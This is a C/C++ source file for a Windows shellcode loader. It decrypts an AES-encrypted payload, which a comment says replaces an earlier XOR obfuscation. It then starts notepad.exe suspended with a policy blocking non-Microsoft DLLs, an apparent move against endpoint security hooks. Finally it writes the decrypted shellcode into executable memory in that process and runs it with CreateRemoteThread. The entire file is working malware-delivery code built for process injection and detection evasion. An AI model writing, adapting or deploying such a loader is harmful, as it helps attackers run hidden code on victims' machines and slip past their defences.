static const unsigned char AES_KEY[32] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
static const int AES_KEY_LEN = 32;
static const int AES_IV_LEN = 16;

// ============================================================
// AES-256-CBC decryption (Windows BCrypt API)
// Payload format: [16-byte IV] + [ciphertext]
// Returns 1 on success; *output and *output_len receive the decryption result (caller frees)
// ============================================================
static int aes_decrypt_payload(
    const unsigned char* payload, int payload_len,
    unsigned char** output, int* output_len)
{
    BCRYPT_ALG_HANDLE  hAlg = NULL;
    BCRYPT_KEY_HANDLE  hKey = NULL;
    unsigned char* key_obj = NULL;
    unsigned char* iv_tmp = NULL;
    unsigned char* result = NULL;
    DWORD              key_obj_len = 0, block_len = 0;
    DWORD              data_len = 0, result_len = 0;
    NTSTATUS           status;
    int                ok = 0;

    *output = NULL;
    *output_len = 0;

    if (payload_len <= AES_IV_LEN) {
        printf("[!] Payload too short: %d bytes\n", payload_len);
        return 0;
    }

    const unsigned char* iv = payload;
    const unsigned char* ciphertext = payload + AES_IV_LEN;
    int                  ct_len = payload_len - AES_IV_LEN;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&key_obj_len, sizeof(DWORD), &data_len, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    status = BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH,
        (PUCHAR)&block_len, sizeof(DWORD), &data_len, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    key_obj = (unsigned char*)malloc(key_obj_len);
    iv_tmp = (unsigned char*)malloc(AES_IV_LEN);
    if (!key_obj || !iv_tmp) goto cleanup;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey,
        key_obj, key_obj_len, (PUCHAR)AES_KEY, AES_KEY_LEN, 0);
    if (!NT_SUCCESS(status)) goto cleanup;

    memcpy(iv_tmp, iv, AES_IV_LEN);
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, ct_len,
        NULL, iv_tmp, AES_IV_LEN, NULL, 0, &result_len, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) goto cleanup;

    result = (unsigned char*)malloc(result_len);
    if (!result) goto cleanup;

    memcpy(iv_tmp, iv, AES_IV_LEN);
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, ct_len,
        NULL, iv_tmp, AES_IV_LEN, result, result_len, &data_len, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) goto cleanup;

    *output = result;
    *output_len = (int)data_len;
    result = NULL;
    ok = 1;

cleanup:
    if (!ok && result) free(result);
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    free(key_obj);
    free(iv_tmp);
    return ok;
}

int main() {
    // ============================================================
    // AES-256-CBC decryption (replaces the original XOR loop)
    // ============================================================
    unsigned char* shellcode = NULL;
    int            shellcode_len = 0;
    int            payload_len = sizeof(shellcode_aes_payload);

    if (!aes_decrypt_payload(shellcode_aes_payload, payload_len,
        &shellcode, &shellcode_len)) {
        printf("[!] AES decryption failed!\n");
        return -1;
    }

    printf("[+] AES decryption done: %d bytes (payload was %d bytes)\n",
        shellcode_len, payload_len);

    // Debug output (optional)
    // for (int i = 0; i < shellcode_len; i++) {
    //     printf("\\x%02x", shellcode[i]);
    // }

    PROCESS_INFORMATION pi = {};
    STARTUPINFOEXA si = {};
    SIZE_T attributeSize = 0;

    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);
    InitializeProcThreadAttributeList(attributes, 1, 0, &attributeSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.lpAttributeList = attributes;

    BOOL success = CreateProcessA(
        NULL,
        (LPSTR)"C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL,
        NULL,
        &si.StartupInfo,
        &pi
    );

    if (!success) {
        std::cerr << "CreateProcessA failed: " << GetLastError() << std::endl;
        free(shellcode);
        return -1;
    }

    LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, shellcode_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        free(shellcode);
        return -1;
    }

    WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, shellcode_len, NULL);
    free(shellcode);   // already written to the target process; free the local plaintext

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hThread) {
        std::cerr << "CreateRemoteThread failed: " << GetLastError() << std::endl;
        return -1;
    }

    //ResumeThread(pi.hThread);

    HeapFree(GetProcessHeap(), 0, attributes);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
